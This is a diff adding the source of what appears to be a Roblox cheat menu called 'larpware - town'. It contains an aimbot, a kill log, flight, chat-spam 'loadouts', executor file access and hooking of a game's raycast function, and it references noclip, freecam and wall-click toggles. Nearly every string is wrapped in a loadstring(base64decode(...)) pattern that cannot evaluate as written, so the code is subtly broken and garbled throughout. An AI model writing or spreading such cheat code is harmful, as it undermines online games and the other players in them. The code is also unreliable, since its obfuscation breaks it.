+    if input.UserInputType ~= Enum.UserInputType.MouseButton2 or UserInputService:GetFocusedTextBox() then return end
+    if options.aimtoggle then
+        aim.running = not aim.running
+        if not aim.running then cancelLock() end
+    else
+        aim.running = true
+    end
+end))
+table.insert(connections, UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType ~= Enum.UserInputType.MouseButton2 then return end
+    if not options.aimtoggle then
+        aim.running = false
+        cancelLock()
+    end
+end))
+
+pcall(function()
+    RunService:BindToRenderStep(loadstring(base64decode("VG93bkVzcEFpbQ=="))(), Enum.RenderPriority.Camera.Value + 1, stepAim)
+end)
+
+local killLog = { alive = true }
+do
+    local KILL_LOG_TIME = 8
+    local KILL_LOG_MAX = 6
+    local KILLER_MAX_AGE = 30
+    local DOWN_HEALTH = 1.5
+    local GUESS_RANGE = 300
+    local ME_COLOR = loadstring(base64decode("IzVhZmY3OA=="))()
+    local DEAD_COLOR = loadstring(base64decode("I2ZmNWE1YQ=="))()
+
+    local logged = setmetatable({}, { __mode = loadstring(base64decode("aw=="))() })
+    local killers = setmetatable({}, { __mode = loadstring(base64decode("aw=="))() })
+    local lines, counter = {}, 0
+
+    local TweenService = game:GetService(loadstring(base64decode("VHdlZW5TZXJ2aWNl"))())
+
+    local frame = Instance.new(loadstring(base64decode("RnJhbWU="))())
+    frame.AnchorPoint = Vector2.new(1, 1)
+    frame.Position = UDim2.new(1, -14, 1, -70)
+    frame.Size = UDim2.fromOffset(360, 200)
+    frame.BackgroundTransparency = 1
+    frame.Parent = overlay
+    local layout = Instance.new(loadstring(base64decode("VUlMaXN0TGF5b3V0"))())
+    layout.SortOrder = Enum.SortOrder.LayoutOrder
+    layout.HorizontalAlignment = Enum.HorizontalAlignment.Right
+    layout.VerticalAlignment = Enum.VerticalAlignment.Bottom
+    layout.Padding = UDim.new(0, 4)
+    layout.Parent = frame
+
+    local function fadeOut(label)
+        if not label.Parent then return end
+        local info = TweenInfo.new(0.4)
+        TweenService:Create(label, info, { BackgroundTransparency = 1, TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
+        local stroke = label:FindFirstChildOfClass(loadstring(base64decode("VUlTdHJva2U="))())
+        if stroke then TweenService:Create(stroke, info, { Transparency = 1 }):Play() end
+        task.delay(0.45, function()
+            if label.Parent then label:Destroy() end
+        end)
+    end
+
+    local function pushLine(text)
+        counter += 1
+        local label = Instance.new(loadstring(base64decode("VGV4dExhYmVs"))())
+        label.LayoutOrder = counter
+        label.AutomaticSize = Enum.AutomaticSize.X
+        label.Size = UDim2.fromOffset(0, 22)
+        label.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        label.BackgroundTransparency = 0.25
+        label.BorderSizePixel = 0
+        label.Font = Enum.Font.Code
+        label.TextSize = 14
+        label.RichText = true
+        label.Text = text
+        label.TextColor3 = COLOR
+        label.TextStrokeTransparency = 0.5
+        label.TextXAlignment = Enum.TextXAlignment.Center
+        local padding = Instance.new(loadstring(base64decode("VUlQYWRkaW5n"))())
+        padding.PaddingLeft = UDim.new(0, 8)
+        padding.PaddingRight = UDim.new(0, 8)
+        padding.Parent = label
+        local stroke = Instance.new(loadstring(base64decode("VUlTdHJva2U="))())
+        stroke.Color = Color3.fromRGB(0, 85, 255)
+        stroke.Thickness = 1
+        stroke.Parent = label
+        label.Parent = frame
+
+        table.insert(lines, label)
+        while #lines > KILL_LOG_MAX do
+            local oldest = table.remove(lines, 1)
+            if oldest then oldest:Destroy() end
+        end
+        task.delay(KILL_LOG_TIME, function()
+            local index = table.find(lines, label)
+            if index then table.remove(lines, index) end
+            fadeOut(label)
+        end)
+    end
+
+    local function colored(name, isMe, meColor)
+        if isMe then return string.format('<font color=loadstring(base64decode("JXM="))()>%s</font>', meColor, name) end
+        return name
+    end
+
+    local guesses = setmetatable({}, { __mode = loadstring(base64decode("aw=="))() })
+
+    local function guessAttacker(player, character)
+        local root = character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
+        if not root then return end
+        local best, bestDistance = nil, GUESS_RANGE
+        for _, other in ipairs(Players:GetPlayers()) do
+            local otherCharacter = other.Character
+            local otherRoot = otherCharacter and otherCharacter:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
+            if other ~= player and otherRoot and otherCharacter:FindFirstChildOfClass(loadstring(base64decode("VG9vbA=="))()) then
+                local distance = (otherRoot.Position - root.Position).Magnitude
+                if distance < bestDistance then best, bestDistance = other, distance end
+            end
+        end
+        return best
+    end
+
+    local function logKill(player, character, humanoid)
+        if not killLog.alive or not character or logged[character] then return end
+        logged[character] = true
+        if not options.killlog then return end
+
+        local killer, guessed
+        local tag = humanoid and humanoid:FindFirstChild(loadstring(base64decode("Y3JlYXRvcg=="))())
+        if tag and tag:IsA(loadstring(base64decode("T2JqZWN0VmFsdWU="))()) then killer = tag.Value end
+        local cached = humanoid and killers[humanoid]
+        if not killer and cached and os.clock() - cached.at < KILLER_MAX_AGE then killer = cached.value end
+        local guess = humanoid and guesses[humanoid]
+        if not killer and guess and os.clock() - guess.at < KILLER_MAX_AGE then killer, guessed = guess.value, true end
+
+        local victimName = player.Name
+        local victimIsMe = player == LocalPlayer
+        if typeof(killer) == loadstring(base64decode("SW5zdGFuY2U="))() and killer ~= player then
+            local killerIsMe = killer == LocalPlayer
+            pushLine(string.format(loadstring(base64decode("JXMga2lsbGVkICVzJXM="))(),
+                colored(killer.Name, killerIsMe, ME_COLOR), colored(victimName, victimIsMe, DEAD_COLOR),
+                guessed and loadstring(base64decode("ICg/KQ=="))() or loadstring(base64decode(""))()))
+        else
+            pushLine(string.format(loadstring(base64decode("JXMgZGllZA=="))(), colored(victimName, victimIsMe, DEAD_COLOR)))
+        end
+    end
+
+    local function watchCharacter(player, character)
+        task.spawn(function()
+            local humanoid = character:WaitForChild(loadstring(base64decode("SHVtYW5vaWQ="))(), 10)
+            if not humanoid or not killLog.alive then return end
+
+            local function remember(tag)
+                if tag.Name ~= loadstring(base64decode("Y3JlYXRvcg=="))() or not tag:IsA(loadstring(base64decode("T2JqZWN0VmFsdWU="))()) then return end
+                local function save()
+                    if tag.Value then killers[humanoid] = { value = tag.Value, at = os.clock() } end
+                end
+                save()
+                tag:GetPropertyChangedSignal(loadstring(base64decode("VmFsdWU="))()):Connect(save)
+            end
+            for _, child in ipairs(humanoid:GetChildren()) do remember(child) end
+            humanoid.ChildAdded:Connect(remember)
+
+            local lastHealth = humanoid.Health
+            humanoid.HealthChanged:Connect(function(health)
+                if health < lastHealth and health > DOWN_HEALTH then
+
+                    local attacker = guessAttacker(player, character)
+                    if attacker then guesses[humanoid] = { value = attacker, at = os.clock() } end
+                end
+                if health <= DOWN_HEALTH then
+                    if lastHealth > DOWN_HEALTH or not logged[character] then
+                        local attacker = guessAttacker(player, character)
+                        if attacker then guesses[humanoid] = { value = attacker, at = os.clock() } end
+                        logKill(player, character, humanoid)
+                    end
+                else
+                    logged[character] = nil
+                end
+                lastHealth = health
+            end)
+            character.ChildAdded:Connect(function(child)
+                if child.Name == loadstring(base64decode("RG93bmVk"))() then logKill(player, character, humanoid) end
+            end)
+            character.ChildRemoved:Connect(function(child)
+                if child.Name == loadstring(base64decode("RG93bmVk"))() and humanoid.Health > DOWN_HEALTH then logged[character] = nil end
+            end)
+            humanoid.Died:Connect(function() logKill(player, character, humanoid) end)
+
+            if humanoid.Health <= DOWN_HEALTH and humanoid.Health > 0 and character:FindFirstChild(loadstring(base64decode("RG93bmVk"))()) then
+                logKill(player, character, humanoid)
+            end
+        end)
+    end
+
+    local function watchPlayer(player)
+        if player.Character then watchCharacter(player, player.Character) end
+        table.insert(connections, player.CharacterAdded:Connect(function(character)
+            watchCharacter(player, character)
+        end))
+    end
+    for _, player in ipairs(Players:GetPlayers()) do watchPlayer(player) end
+    table.insert(connections, Players.PlayerAdded:Connect(watchPlayer))
+
+    local bloodEvent = ReplicatedStorage:FindFirstChild(loadstring(base64decode("Qmxvb2RFdmVudA=="))())
+    if bloodEvent then
+        table.insert(connections, bloodEvent.OnClientEvent:Connect(function(character, kind)
+            if kind ~= loadstring(base64decode("Y29ycHNl"))() or typeof(character) ~= loadstring(base64decode("SW5zdGFuY2U="))() then return end
+            local player = Players:GetPlayerFromCharacter(character)
+            if player then logKill(player, character, character:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())) end
+        end))
+    end
+
+    function killLog.clear()
+        for _, label in ipairs(lines) do label:Destroy() end
+        lines = {}
+    end
+end
+
+local THEME = {
+    back = Color3.fromRGB(28, 28, 28),
+    main = Color3.fromRGB(20, 20, 20),
+    accent = Color3.fromRGB(0, 85, 255),
+    outline = Color3.fromRGB(50, 50, 50),
+    text = Color3.new(1, 1, 1),
+    dim = Color3.fromRGB(150, 150, 150),
+}
+local UI_FONT = Enum.Font.Code
+
+local function make(class, props, parent)
+    local object = Instance.new(class)
+    for key, value in pairs(props) do object[key] = value end
+    object.Parent = parent
+    return object
+end
+
+local menu = make(loadstring(base64decode("U2NyZWVuR3Vp"))(), { Name = loadstring(base64decode("TGFycHdhcmVNZW51"))(), ResetOnSpawn = false, DisplayOrder = 2 }, parentGui)
+
+local window = make(loadstring(base64decode("RnJhbWU="))(), {
+    Size = UDim2.fromOffset(560, 430),
+    Position = UDim2.fromOffset(60, 60),
+    BackgroundColor3 = THEME.back,
+    BorderColor3 = Color3.new(0, 0, 0),
+    BorderSizePixel = 1,
+    Active = true,
+}, menu)
+make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.new(1, 0, 0, 2), BackgroundColor3 = THEME.accent, BorderSizePixel = 0 }, window)
+
+local titleBar = make(loadstring(base64decode("VGV4dExhYmVs"))(), {
+    Size = UDim2.new(1, 0, 0, 24), Position = UDim2.fromOffset(0, 2),
+    BackgroundTransparency = 1, Font = UI_FONT, Text = loadstring(base64decode("ICBsYXJwd2FyZSAtIHRvd24="))(), TextSize = 15,
+    TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left,
+}, window)
+
+local tabBar = make(loadstring(base64decode("RnJhbWU="))(), {
+    Position = UDim2.fromOffset(8, 28), Size = UDim2.new(1, -16, 0, 22), BackgroundTransparency = 1,
+}, window)
+make(loadstring(base64decode("VUlMaXN0TGF5b3V0"))(), {
+    FillDirection = Enum.FillDirection.Horizontal, Padding = UDim.new(0, 2), SortOrder = Enum.SortOrder.LayoutOrder,
+}, tabBar)
+
+local pages = make(loadstring(base64decode("RnJhbWU="))(), {
+    Position = UDim2.fromOffset(8, 50), Size = UDim2.new(1, -16, 1, -76),
+    BackgroundColor3 = THEME.back, BorderColor3 = THEME.outline, BorderSizePixel = 1,
+}, window)
+
+local statusLabel = make(loadstring(base64decode("VGV4dExhYmVs"))(), {
+    Position = UDim2.new(0, 10, 1, -20), Size = UDim2.new(1, -20, 0, 16), BackgroundTransparency = 1,
+    Font = UI_FONT, TextSize = 12, TextColor3 = THEME.dim, TextXAlignment = Enum.TextXAlignment.Left, Text = loadstring(base64decode(""))(),
+}, window)
+local notifyToken = 0
+local function notify(text)
+    notifyToken += 1
+    local mine = notifyToken
+    statusLabel.Text = text
+    task.delay(2.5, function()
+        if notifyToken == mine then statusLabel.Text = loadstring(base64decode(""))() end
+    end)
+end
+
+local activeSlider
+table.insert(connections, UserInputService.InputChanged:Connect(function(input)
+    if activeSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        activeSlider(input.Position.X)
+    end
+end))
+table.insert(connections, UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        activeSlider = nil
+    end
+end))
+
+local bindCapture, lastBindInput
+table.insert(connections, UserInputService.InputBegan:Connect(function(input)
+    if bindCapture and input.UserInputType == Enum.UserInputType.Keyboard then
+        local finish = bindCapture
+        bindCapture, lastBindInput = nil, input
+        finish(input.KeyCode)
+    end
+end))
+
+local function makeGroup(column, title)
+    local box = make(loadstring(base64decode("RnJhbWU="))(), {
+        Size = UDim2.new(1, -6, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
+        BackgroundColor3 = THEME.main, BorderColor3 = THEME.outline, BorderSizePixel = 1,
+    }, column)
+    make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.new(1, 0, 0, 2), BackgroundColor3 = THEME.accent, BorderSizePixel = 0 }, box)
+    local body = make(loadstring(base64decode("RnJhbWU="))(), {
+        Position = UDim2.fromOffset(0, 2), Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
+        BackgroundTransparency = 1,
+    }, box)
+    make(loadstring(base64decode("VUlMaXN0TGF5b3V0"))(), { Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder }, body)
+    make(loadstring(base64decode("VUlQYWRkaW5n"))(), { PaddingTop = UDim.new(0, 4), PaddingBottom = UDim.new(0, 6), PaddingLeft = UDim.new(0, 6), PaddingRight = UDim.new(0, 6) }, body)
+    make(loadstring(base64decode("VGV4dExhYmVs"))(), {
+        Size = UDim2.new(1, 0, 0, 16), BackgroundTransparency = 1, Font = UI_FONT, Text = title, TextSize = 14,
+        TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left,
+    }, body)
+
+    local group = {}
+
+    function group.Toggle(text, key, onChange)
+        local row = make(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), { Size = UDim2.new(1, 0, 0, 16), BackgroundTransparency = 1, Text = loadstring(base64decode(""))(), AutoButtonColor = false }, body)
+        local check = make(loadstring(base64decode("RnJhbWU="))(), {
+            Size = UDim2.fromOffset(12, 12), Position = UDim2.fromOffset(0, 2),
+            BackgroundColor3 = THEME.back, BorderColor3 = THEME.outline, BorderSizePixel = 1,
+        }, row)
+        make(loadstring(base64decode("VGV4dExhYmVs"))(), {
+            Position = UDim2.fromOffset(20, 0), Size = UDim2.new(1, -20, 1, 0), BackgroundTransparency = 1,
+            Font = UI_FONT, Text = text, TextSize = 14, TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left,
+        }, row)
+        local function refresh()
+            check.BackgroundColor3 = options[key] and THEME.accent or THEME.back
+        end
+        row.MouseButton1Click:Connect(function()
+            options[key] = not options[key]
+            if onChange then onChange(options[key]) end
+            refresh()
+        end)
+        refresh()
+        return refresh
+    end
+
+    function group.Slider(text, min, max, get, set, suffix)
+        local row = make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.new(1, 0, 0, 30), BackgroundTransparency = 1 }, body)
+        make(loadstring(base64decode("VGV4dExhYmVs"))(), {
+            Size = UDim2.new(1, 0, 0, 14), BackgroundTransparency = 1, Font = UI_FONT, Text = text, TextSize = 14,
+            TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left,
+        }, row)
+        local value = make(loadstring(base64decode("VGV4dExhYmVs"))(), {
+            Size = UDim2.new(1, 0, 0, 14), BackgroundTransparency = 1, Font = UI_FONT, Text = loadstring(base64decode(""))(), TextSize = 14,
+            TextColor3 = THEME.dim, TextXAlignment = Enum.TextXAlignment.Right,
+        }, row)
+        local track = make(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), {
+            Position = UDim2.fromOffset(0, 17), Size = UDim2.new(1, 0, 0, 10), Text = loadstring(base64decode(""))(), AutoButtonColor = false,
+            BackgroundColor3 = THEME.back, BorderColor3 = THEME.outline, BorderSizePixel = 1,
+        }, row)
+        local fill = make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.new(0, 0, 1, 0), BackgroundColor3 = THEME.accent, BorderSizePixel = 0 }, track)
+        local function refresh()
+            local current = get()
+            fill.Size = UDim2.new(math.clamp((current - min) / (max - min), 0, 1), 0, 1, 0)
+            value.Text = tostring(current) .. (suffix or loadstring(base64decode(""))())
+        end
+        local function fromX(x)
+            local fraction = math.clamp((x - track.AbsolutePosition.X) / math.max(track.AbsoluteSize.X, 1), 0, 1)
+            set(math.floor(min + fraction * (max - min) + 0.5))
+            refresh()
+        end
+        track.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                activeSlider = fromX
+                fromX(input.Position.X)
+            end
+        end)
+        refresh()
+    end
+
+    function group.Cycle(text, values, get, set)
+        local row = make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.new(1, 0, 0, 38), BackgroundTransparency = 1 }, body)
+        make(loadstring(base64decode("VGV4dExhYmVs"))(), {
+            Size = UDim2.new(1, 0, 0, 14), BackgroundTransparency = 1, Font = UI_FONT, Text = text, TextSize = 14,
+            TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left,
+        }, row)
+        local box = make(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), {
+            Position = UDim2.fromOffset(0, 16), Size = UDim2.new(1, 0, 0, 20), AutoButtonColor = false, Text = loadstring(base64decode(""))(),
+            BackgroundColor3 = THEME.back, BorderColor3 = THEME.outline, BorderSizePixel = 1,
+            Font = UI_FONT, TextSize = 14, TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left,
+        }, row)
+        make(loadstring(base64decode("VGV4dExhYmVs"))(), {
+            Size = UDim2.new(1, -6, 1, 0), BackgroundTransparency = 1, Font = UI_FONT, Text = loadstring(base64decode("dg=="))(), TextSize = 12,
+            TextColor3 = THEME.dim, TextXAlignment = Enum.TextXAlignment.Right,
+        }, box)
+        local function refresh() box.Text = loadstring(base64decode("ICA="))() .. tostring(values[get()]) end
+        box.MouseButton1Click:Connect(function() set(get() % #values + 1); refresh() end)
+        box.MouseButton2Click:Connect(function() set((get() - 2) % #values + 1); refresh() end)
+        refresh()
+    end
+
+    function group.Button(text, onClick)
+        local button = make(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), {
+            Size = UDim2.new(1, 0, 0, 20), AutoButtonColor = false, Text = text,
+            BackgroundColor3 = THEME.back, BorderColor3 = THEME.outline, BorderSizePixel = 1,
+            Font = UI_FONT, TextSize = 14, TextColor3 = THEME.text,
+        }, body)
+        button.MouseButton1Click:Connect(onClick)
+        return button
+    end
+
+    function group.Keybind(text, get, set)
+        local row = make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.new(1, 0, 0, 20), BackgroundTransparency = 1 }, body)
+        make(loadstring(base64decode("VGV4dExhYmVs"))(), {
+            Size = UDim2.new(1, -70, 1, 0), BackgroundTransparency = 1, Font = UI_FONT, Text = text, TextSize = 14,
+            TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left,
+        }, row)
+        local box = make(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), {
+            Position = UDim2.new(1, -64, 0, 0), Size = UDim2.fromOffset(64, 20), AutoButtonColor = false, Text = loadstring(base64decode(""))(),
+            BackgroundColor3 = THEME.back, BorderColor3 = THEME.outline, BorderSizePixel = 1,
+            Font = UI_FONT, TextSize = 13, TextColor3 = THEME.text,
+        }, row)
+        local function refresh()
+            local key = get()
+            box.Text = key and key.Name or loadstring(base64decode("Tm9uZQ=="))()
+        end
+        box.MouseButton1Click:Connect(function()
+            box.Text = loadstring(base64decode("Li4u"))()
+            bindCapture = function(key)
+                set(key ~= Enum.KeyCode.Escape and key or nil)
+                refresh()
+            end
+        end)
+        refresh()
+    end
+
+    function group.Input(placeholder, onEnter)
+        local input = make(loadstring(base64decode("VGV4dEJveA=="))(), {
+            Size = UDim2.new(1, 0, 0, 20), Text = loadstring(base64decode(""))(), PlaceholderText = placeholder, ClearTextOnFocus = false,
+            PlaceholderColor3 = Color3.fromRGB(120, 120, 120),
+            BackgroundColor3 = THEME.back, BorderColor3 = THEME.outline, BorderSizePixel = 1,
+            Font = UI_FONT, TextSize = 14, TextColor3 = THEME.text, TextXAlignment = Enum.TextXAlignment.Left,
+        }, body)
+        input.FocusLost:Connect(function(enterPressed)
+            if enterPressed then
+                onEnter(input.Text)
+                input.Text = loadstring(base64decode(""))()
+            end
+        end)
+        return input
+    end
+
+    function group.TextArea(placeholder, initial, onChange, onCommit)
+        local box = make(loadstring(base64decode("VGV4dEJveA=="))(), {
+            Size = UDim2.new(1, 0, 0, 110), Text = initial or loadstring(base64decode(""))(), PlaceholderText = placeholder,
+            ClearTextOnFocus = false, MultiLine = true, TextWrapped = true,
+            PlaceholderColor3 = Color3.fromRGB(120, 120, 120),
+            BackgroundColor3 = THEME.back, BorderColor3 = THEME.outline, BorderSizePixel = 1,
+            Font = UI_FONT, TextSize = 14, TextColor3 = THEME.text,
+            TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top,
+        }, body)
+        box:GetPropertyChangedSignal(loadstring(base64decode("VGV4dA=="))()):Connect(function()
+            if onChange then onChange(box.Text) end
+        end)
+        box.FocusLost:Connect(function()
+            if onCommit then onCommit(box.Text) end
+        end)
+        return box
+    end
+
+    function group.Label(text)
+        return make(loadstring(base64decode("VGV4dExhYmVs"))(), {
+            Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, BackgroundTransparency = 1,
+            Font = UI_FONT, Text = text, TextSize = 12, TextColor3 = THEME.dim, RichText = true, TextWrapped = true,
+            TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top,
+        }, body)
+    end
+
+    function group.Container()
+        local container = make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, BackgroundTransparency = 1 }, body)
+        make(loadstring(base64decode("VUlMaXN0TGF5b3V0"))(), { Padding = UDim.new(0, 2), SortOrder = Enum.SortOrder.LayoutOrder }, container)
+        return container
+    end
+
+    return group
+end
+
+local tabs = {}
+local function selectTab(tab)
+    for _, other in ipairs(tabs) do
+        local selected = other == tab
+        other.page.Visible = selected
+        other.button.BackgroundColor3 = selected and THEME.back or THEME.main
+        other.button.TextColor3 = selected and THEME.text or THEME.dim
+        other.accent.Visible = selected
+    end
+end
+
+local function addTab(name)
+    local tab = {}
+    tab.button = make(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), {
+        Size = UDim2.fromOffset(#name * 8 + 24, 22), AutoButtonColor = false, Text = name, LayoutOrder = #tabs + 1,
+        BackgroundColor3 = THEME.main, BorderColor3 = THEME.outline, BorderSizePixel = 1,
+        Font = UI_FONT, TextSize = 14, TextColor3 = THEME.dim,
+    }, tabBar)
+    tab.accent = make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.new(1, 0, 0, 2), BackgroundColor3 = THEME.accent, BorderSizePixel = 0, Visible = false }, tab.button)
+    tab.page = make(loadstring(base64decode("RnJhbWU="))(), { Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, Visible = false }, pages)
+
+    local function column(x, offset)
+        local scroller = make(loadstring(base64decode("U2Nyb2xsaW5nRnJhbWU="))(), {
+            Position = UDim2.new(x, offset, 0, 6), Size = UDim2.new(0.5, -9, 1, -12), BackgroundTransparency = 1,
+            BorderSizePixel = 0, ScrollBarThickness = 3, ScrollBarImageColor3 = THEME.accent,
+            CanvasSize = UDim2.new(), AutomaticCanvasSize = Enum.AutomaticSize.Y, ScrollingDirection = Enum.ScrollingDirection.Y,
+        }, tab.page)
+        make(loadstring(base64decode("VUlMaXN0TGF5b3V0"))(), { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder }, scroller)
+        return scroller
+    end
+    local left, right = column(0, 6), column(0.5, 3)
+
+    function tab.group(side, title)
+        return makeGroup(side == loadstring(base64decode("bGVmdA=="))() and left or right, title)
+    end
+
+    tab.button.MouseButton1Click:Connect(function() selectTab(tab) end)
+    table.insert(tabs, tab)
+    return tab
+end
+
+local loadout = { token = 0, text = loadstring(base64decode(""))(), delayMs = 2500, running = false }
+do
+    local LOADOUT_FILE = loadstring(base64decode("TGFycHdhcmVMb2Fkb3V0LnR4dA=="))()
+    local TextChatService = game:GetService(loadstring(base64decode("VGV4dENoYXRTZXJ2aWNl"))())
+
+    if type(isfile) == loadstring(base64decode("ZnVuY3Rpb24="))() and type(readfile) == loadstring(base64decode("ZnVuY3Rpb24="))() then
+        local ok, text = pcall(function()
+            return isfile(LOADOUT_FILE) and readfile(LOADOUT_FILE) or loadstring(base64decode(""))()
+        end)
+        if ok then loadout.text = text end
+    end
+
+    function loadout.save()
+        if type(writefile) == loadstring(base64decode("ZnVuY3Rpb24="))() then pcall(writefile, LOADOUT_FILE, loadout.text) end
+    end
+
+    local function sendChat(message)
+        task.spawn(function()
+            local ok = pcall(function()
+                local channel = TextChatService:FindFirstChild(loadstring(base64decode("VGV4dENoYW5uZWxz"))())
+                    and TextChatService.TextChannels:FindFirstChild(loadstring(base64decode("UkJYR2VuZXJhbA=="))())
+                assert(channel, loadstring(base64decode("bm8gUkJYR2VuZXJhbCBjaGFubmVs"))())
+                channel:SendAsync(message)
+            end)
+            if ok then return end
+
+            local events = ReplicatedStorage:FindFirstChild(loadstring(base64decode("RGVmYXVsdENoYXRTeXN0ZW1DaGF0RXZlbnRz"))())
+            local say = events and events:FindFirstChild(loadstring(base64decode("U2F5TWVzc2FnZVJlcXVlc3Q="))())
+            if say then say:FireServer(message, loadstring(base64decode("QWxs"))()) end
+        end)
+        return true
+    end
+
+    function loadout.stop()
+        loadout.token += 1
+        loadout.running = false
+    end
+
+    local serverMessage = ReplicatedStorage:FindFirstChild(loadstring(base64decode("U2VydmVyRGlzcGxheU1lc3NhZ2U="))())
+    if serverMessage then
+        table.insert(connections, serverMessage.OnClientEvent:Connect(function(message)
+            if not loadout.running then return end
+            local text = tostring(message):gsub(loadstring(base64decode("PFtePl0rPg=="))(), loadstring(base64decode(""))())
+            print(loadstring(base64decode("W2xhcnB3YXJlXSBnYW1lIHNheXM6IA=="))() .. text)
+            notify(loadstring(base64decode("R2FtZTog"))() .. string.sub(text, 1, 70))
+        end))
+    end
+
+    function loadout.run(auto)
+
+        if auto and loadout.running then return end
+        loadout.token += 1
+        local mine = loadout.token
+
+        local commands = {}
+        local normalized = (loadout.text:gsub(loadstring(base64decode("KCVTKSVzKyghKQ=="))(), loadstring(base64decode("JTFcbiUy"))()))
+        for line in string.gmatch(normalized, loadstring(base64decode("W15cclxuXSs="))()) do
+            local trimmed = line:match(loadstring(base64decode("XiVzKiguLSklcyok"))())
+            if trimmed ~= loadstring(base64decode(""))() then table.insert(commands, trimmed) end
+        end
+        if #commands == 0 then
+            notify(loadstring(base64decode("TG9hZG91dCBpcyBlbXB0eQ=="))())
+            return
+        end
+
+        loadout.running = true
+        task.spawn(function()
+            for index, command in ipairs(commands) do
+                if loadout.token ~= mine then return end
+                notify(string.format(loadstring(base64decode("TG9hZG91dCAlZC8lZDogJXM="))(), index, #commands, command))
+                print(string.format(loadstring(base64decode("W2xhcnB3YXJlXSBsb2Fkb3V0ICVkLyVkOiAlcw=="))(), index, #commands, command))
+                sendChat(command)
+
+                local waitUntil = os.clock() + loadout.delayMs / 1000
+                while os.clock() < waitUntil do
+                    if loadout.token ~= mine then return end
+                    task.wait(0.1)
+                end
+            end
+            if loadout.token == mine then
+                loadout.running = false
+                notify(loadstring(base64decode("TG9hZG91dCBkb25l"))())
+            end
+        end)
+    end
+
+    table.insert(connections, LocalPlayer.CharacterAdded:Connect(function()
+        if not options.loadoutspawn then return end
+        task.wait(1.5)
+        if options.loadoutspawn and LocalPlayer.Character then loadout.run(true) end
+    end))
+end
+
+local fly = { speed = 60, key = Enum.KeyCode.G, was = false }
+local refreshFly
+
+local function setFly(on)
+    options.fly = on
+    if not on then
+        local character = LocalPlayer.Character
+        local root = character and character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
+        if root and fly.was then root.AssemblyLinearVelocity = Vector3.zero end
+        fly.was = false
+    end
+    if refreshFly then refreshFly() end
+end
+
+table.insert(connections, RunService.Heartbeat:Connect(function()
+    if not options.fly then return end
+    local character = LocalPlayer.Character
+    local root = character and character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
+    local camera = Workspace.CurrentCamera
+    if not root or not camera then return end
+    fly.was = true
+    if options.freecam then root.AssemblyLinearVelocity = Vector3.zero return end
+
+    local move = Vector3.zero
+    if not UserInputService:GetFocusedTextBox() then
+        local function down(key) return UserInputService:IsKeyDown(key) and 1 or 0 end
+        local look, right = camera.CFrame.LookVector, camera.CFrame.RightVector
+        move = look * (down(Enum.KeyCode.W) - down(Enum.KeyCode.S))
+            + right * (down(Enum.KeyCode.D) - down(Enum.KeyCode.A))
+            + Vector3.yAxis * (down(Enum.KeyCode.Space) - down(Enum.KeyCode.LeftControl))
+    end
+    root.AssemblyLinearVelocity = move.Magnitude > 0 and move.Unit * fly.speed or Vector3.zero
+end))
+
+table.insert(connections, UserInputService.InputBegan:Connect(function(input, processed)
+    if processed or input == lastBindInput or bindCapture then return end
+    if fly.key and input.KeyCode == fly.key then
+        setFly(not options.fly)
+        notify(options.fly and loadstring(base64decode("RmxpZ2h0IG9u"))() or loadstring(base64decode("RmxpZ2h0IG9mZg=="))())
+    end
+end))
+
+local function cleanup()
+    killLog.alive = false
+    loadout.stop()
+    if options.day and savedClock then Lighting.ClockTime = savedClock end
+    options.nodark = false
+    options.nofog = false
+    options.wallclick = false
+    options.noclip = false
+    options.freecam = false
+    setFly(false)
+    options.aimbot = false
+    options.spy = false
+    aim.running = false
+    cancelLock()
+    gun.alive = false
+    if gun.env then
+        if gun.rayWrap and gun.env.RayCast2 == gun.rayWrap then pcall(rawset, gun.env, loadstring(base64decode("UmF5Q2FzdDI="))(), gun.rayOrig) end
